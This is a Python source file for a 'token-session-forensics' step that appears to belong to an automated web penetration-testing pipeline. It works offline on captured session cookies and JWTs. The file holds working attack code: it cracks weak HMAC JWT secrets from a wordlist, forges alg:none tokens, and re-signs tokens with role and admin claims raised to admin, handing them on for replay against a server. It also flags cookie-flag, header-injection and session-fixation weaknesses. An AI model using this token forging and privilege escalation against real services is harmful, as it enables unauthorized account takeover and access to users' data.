#!/usr/bin/env python3
"""
run.py -- token-session-forensics entry point.

OFFLINE cryptographic + architectural analysis of the authentication mechanisms
captured in Phase 3. No network requests are made: this skill reasons over the
tokens and cookies already in the session pool and produces an "auth model" --
what can be minted, stolen, or replayed -- plus forged-token PoCs for the Phase
5 HTTP Tool to actually test against the server.

CONTRACT
--------
* Input  : JSON on argv[1] or stdin:
    { "session_pool_spill_id": "phase3_sessions_hash",
      "config": {"wordlist": null, "domain_apex_broad": true} }
* Output : one strict JSON artifact on stdout (references/ARTIFACT_SCHEMA.md).
           No prose. On fatal error, a schema-valid artifact with
           meta.status == "error".

CUSTODY
-------
A cracked HS256 secret's RAW value never enters the artifact -- only its
SHA-256 hash. The raw secret and any privilege-escalated forged tokens are
written to the spill store and referenced by id, for Phase 5 use.

The JWT crypto here is implemented in the standard library (HMAC/base64), so
the skill runs with zero third-party dependencies. PyJWT/cryptography are
optional and, if installed, may be used by downstream consumers -- the analysis
does not require them.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import os
import sys
import time
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple

try:
    from spill_store import read_spill, write_spill
except ImportError:  # pragma: no cover
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    from spill_store import read_spill, write_spill  # type: ignore

_WORDLIST = os.environ.get(
    "JWT_WORDLIST",
    os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "assets", "jwt_secrets.txt"))
_JWT_RE = None  # compiled lazily


def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


# --- base64url helpers --------------------------------------------------------
def _b64url_decode(seg: str) -> bytes:
    seg = seg.encode("ascii", "ignore")
    pad = b"=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg + pad)


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


# --- JWT primitives (stdlib) --------------------------------------------------
_HASHES = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}


def parse_jwt(token: str) -> Optional[Tuple[dict, dict, str, str]]:
    """Return (header, payload, signing_input, signature_b64) or None."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
    except Exception:  # noqa: BLE001
        return None
    if not isinstance(header, dict) or not isinstance(payload, dict):
        return None
    signing_input = parts[0] + "." + parts[1]
    return header, payload, signing_input, parts[2]


def _hs_sign(signing_input: str, secret: bytes, alg: str) -> str:
    h = _HASHES.get(alg, hashlib.sha256)
    return _b64url_encode(hmac.new(secret, signing_input.encode(), h).digest())


def verify_hs(signing_input: str, sig_b64: str, secret: bytes, alg: str) -> bool:
    return hmac.compare_digest(_hs_sign(signing_input, secret, alg), sig_b64)


def forge_none_alg(header: dict, payload: dict) -> str:
    """Build an alg:none token (empty signature) for the server to be tested."""
    h = dict(header)
    h["alg"] = "none"
    hb = _b64url_encode(json.dumps(h, separators=(",", ":")).encode())
    pb = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{hb}.{pb}."


def forge_hs(header: dict, payload: dict, secret: bytes, alg: str = "HS256") -> str:
    h = dict(header)
    h["alg"] = alg
    hb = _b64url_encode(json.dumps(h, separators=(",", ":")).encode())
    pb = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{hb}.{pb}.{_hs_sign(hb + '.' + pb, secret, alg)}"


class TokenForensics:
    ROLE_CLAIMS = ("role", "roles", "scope", "scp", "authorities", "groups",
                   "admin", "is_admin", "isAdmin", "permissions")

    def __init__(self, session_pool_spill_id: str, config: Optional[dict] = None):
        self.pool_id = session_pool_spill_id
        self.config = config or {}
        self.errors: List[Dict[str, str]] = []
        self.sessions: List[dict] = []
        self.secrets = self._load_wordlist()

    def _load_wordlist(self) -> List[bytes]:
        path = self.config.get("wordlist") or _WORDLIST
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as fh:
                return [ln.rstrip("\n").encode() for ln in fh
                        if ln.strip() and not ln.startswith("#")]
        except Exception as exc:  # noqa: BLE001
            self.errors.append({"stage": "wordlist", "error": str(exc)})
            return []

    # -- loading ---------------------------------------------------------------
    def load_sessions(self) -> None:
        try:
            data = read_spill(self.pool_id)
        except Exception as exc:  # noqa: BLE001
            self.errors.append({"stage": "load_sessions", "error": str(exc)})
            return
        self.sessions = data.get("session_pool", data) if isinstance(data, dict) else data or []

    # -- cookie flag analysis --------------------------------------------------
    def analyze_cookies(self) -> List[dict]:
        out, seen = [], set()
        apex_broad = self.config.get("domain_apex_broad", True)
        for sess in self.sessions:
            for c in sess.get("cookies", []) or []:
                name = c.get("name", "")
                if not name or name in seen:
                    continue
                seen.add(name)
                domain = (c.get("domain") or "")
                samesite = str(c.get("sameSite") or c.get("samesite") or "").strip() or "None"
                too_broad = domain.startswith(".") or (apex_broad and domain.count(".") == 1)
                out.append({
                    "name": name,
                    "missing_httponly": not bool(c.get("httpOnly", c.get("httponly", False))),
                    "missing_secure": not bool(c.get("secure", False)),
                    "samesite_value": samesite,
                    "domain_too_broad": bool(too_broad),
                    "domain": domain,
                })
        return out

    # -- JWT extraction & analysis ---------------------------------------------
    def _collect_tokens(self) -> List[Tuple[str, str]]:
        """Return list of (token, source) across cookies, auth headers, storage."""
        import re
        global _JWT_RE
        if _JWT_RE is None:
            _JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")
        found: List[Tuple[str, str]] = []
        seen = set()

        def add(tok, src):
            if tok and tok not in seen:
                seen.add(tok)
                found.append((tok, src))

        for sess in self.sessions:
            role = sess.get("role", "?")
            for k, v in (sess.get("auth_headers") or {}).items():
                for m in _JWT_RE.findall(str(v)):
                    add(m, f"{role}:header:{k}")
            for c in sess.get("cookies", []) or []:
                for m in _JWT_RE.findall(str(c.get("value", ""))):
                    add(m, f"{role}:cookie:{c.get('name')}")
            sid = sess.get("state_spill_id")
            if sid:
                try:
                    state = read_spill(sid)
                    blob = json.dumps(state)
                    for m in _JWT_RE.findall(blob):
                        add(m, f"{role}:storage")
                except Exception:  # noqa: BLE001
                    pass
        return found

    def crack_jwt_weak_secrets(self, signing_input: str, sig: str, alg: str) -> Optional[bytes]:
        if alg not in _HASHES:
            return None
        for secret in self.secrets:
            if verify_hs(signing_input, sig, secret, alg):
                return secret
        return None

    def analyze_jwt(self, token: str, source: str) -> Optional[dict]:
        parsed = parse_jwt(token)
        if not parsed:
            return None
        header, payload, signing_input, sig = parsed
        alg = str(header.get("alg", "")).upper()
        vulns: List[str] = []
        forged_none = None
        cracked_hash = None
        cracked_spill = None

        # alg:none structurally possible -> provide forged token for Phase 5
        forged_none = forge_none_alg(header, payload)
        vulns.append("none_alg_possible")

        # weak HS secret crack (offline)
        if alg in _HASHES and sig:
            secret = self.crack_jwt_weak_secrets(signing_input, sig, alg)
            if secret is not None:
                vulns.append("weak_secret_cracked")
                cracked_hash = hashlib.sha256(secret).hexdigest()
                # custody: raw secret + escalated forged tokens go to spill only
                escalated = dict(payload)
                for claim in ("role", "roles", "admin", "is_admin", "isAdmin"):
                    if claim in escalated:
                        escalated[claim] = True if "admin" in claim.lower() else "admin"
                cracked_spill = write_spill({
                    "alg": alg, "secret": secret.decode("utf-8", "replace"),
                    "resigned_token": forge_hs(header, payload, secret, alg),
                    "privilege_escalated_token": forge_hs(header, escalated, secret, alg),
                    "source": source,
                })

        # asymmetric -> RS256/ES256 -> HS256 confusion candidate (needs pubkey)
        if alg in ("RS256", "RS384", "RS512", "ES256", "ES384", "ES512", "PS256"):
            vulns.append("alg_confusion_possible")

        # header injection vectors
        if any(k in header for k in ("jku", "x5u")):
            vulns.append("jku_injection")
        if "kid" in header:
            vulns.append("kid_injection")

        # expiry: token in an ACTIVE pool yet already expired -> exp likely unenforced
        exp = payload.get("exp")
        if isinstance(exp, (int, float)) and exp < time.time():
            vulns.append("expired_but_accepted")

        return {
            "source": source,
            "header": header,
            "payload": payload,
            "algorithm": alg or "unknown",
            "vulnerabilities": sorted(set(vulns)),
            "forged_token_none_alg": forged_none,
            "cracked_secret_hash": cracked_hash,
            "cracked_secret_spill_id": cracked_spill,
        }

    # -- session fixation ------------------------------------------------------
    def check_session_fixation(self) -> dict:
        """Fixation = the session identifier does not change across authentication.

        Requires a paired pre-auth / post-auth capture. We read optional
        `pre_login_cookies` (or `pre_auth_cookies`) on a session; absent that,
        we report `insufficient_data` honestly rather than guessing.
        """
        id_names = ("session", "sessionid", "sid", "jsessionid", "phpsessid",
                    "connect.sid", "asp.net_sessionid", "_session_id", "sessionId")

        def sid_of(cookies):
            for c in cookies or []:
                if (c.get("name", "") or "").lower().replace("-", "").replace("_", "") in \
                        {n.replace("-", "").replace("_", "") for n in id_names}:
                    return c.get("name"), c.get("value")
            return None, None

        for sess in self.sessions:
            pre = sess.get("pre_login_cookies") or sess.get("pre_auth_cookies")
            if pre is None:
                continue
            pre_name, pre_val = sid_of(pre)
            post_name, post_val = sid_of(sess.get("cookies"))
            if pre_val and post_val and pre_name == post_name:
                if pre_val == post_val:
                    return {"vulnerable": True,
                            "evidence": f"session id '{post_name}' unchanged across login "
                                        f"({sess.get('role','?')}): pre==post"}
                return {"vulnerable": False,
                        "evidence": f"session id '{post_name}' rotated on login ({sess.get('role','?')})"}
        return {"vulnerable": False,
                "evidence": "insufficient_data: no paired pre-auth/post-auth session "
                            "capture supplied (add pre_login_cookies to a session to test)"}

    # -- assembly --------------------------------------------------------------
    def build(self, started: float) -> dict:
        cookies = self.analyze_cookies()
        jwts = []
        for token, source in self._collect_tokens():
            a = self.analyze_jwt(token, source)
            if a:
                jwts.append(a)
        fixation = self.check_session_fixation()
        status = "ok" if (self.sessions or not self.errors) else "error"
        return {
            "cookies": cookies,
            "jwts": jwts,
            "session_fixation": fixation,
            "meta": {
                "skill": "token-session-forensics", "version": "1.0", "phase": "3",
                "status": status if self.sessions else "error",
                "generated_at": _now_iso(),
                "duration_seconds": round(time.time() - started, 2),
                "sessions_analyzed": len(self.sessions),
                "jwts_found": len(jwts),
                "wordlist_size": len(self.secrets),
                "offline_only": True,
            },
            "errors": self.errors,
        }

    async def run(self) -> dict:
        started = time.time()
        self.load_sessions()
        return self.build(started)


# --- entry point -------------------------------------------------------------
def _load_input(argv: List[str]) -> dict:
    raw = ""
    if len(argv) > 1 and argv[1].strip():
        raw = argv[1]
    elif not sys.stdin.isatty():
        raw = sys.stdin.read()
    raw = raw.strip()
    if not raw:
        raise ValueError("no input: expected JSON {\"session_pool_spill_id\":\"...\"}")
    obj = json.loads(raw)
    if not isinstance(obj, dict):
        raise ValueError("input must be a JSON object")
    return obj


def _error_artifact(message: str) -> dict:
    return {
        "cookies": [], "jwts": [],
        "session_fixation": {"vulnerable": False, "evidence": "not analyzed"},
        "meta": {"skill": "token-session-forensics", "version": "1.0", "phase": "3",
                 "status": "error", "generated_at": _now_iso(), "offline_only": True},
        "errors": [{"stage": "init", "error": message}],
    }


async def _amain(argv: List[str]) -> int:
    try:
        payload = _load_input(argv)
    except Exception as exc:  # noqa: BLE001
        print(json.dumps(_error_artifact(f"input error: {exc}")))
        return 2
    pid = payload.get("session_pool_spill_id")
    if not pid:
        print(json.dumps(_error_artifact("need 'session_pool_spill_id'")))
        return 2
    tf = TokenForensics(pid, config=payload.get("config"))
    artifact = await tf.run()
    print(json.dumps(artifact, ensure_ascii=False))
    return 0


def main() -> int:
    import asyncio
    return asyncio.run(_amain(sys.argv))


if __name__ == "__main__":
    raise SystemExit(main())
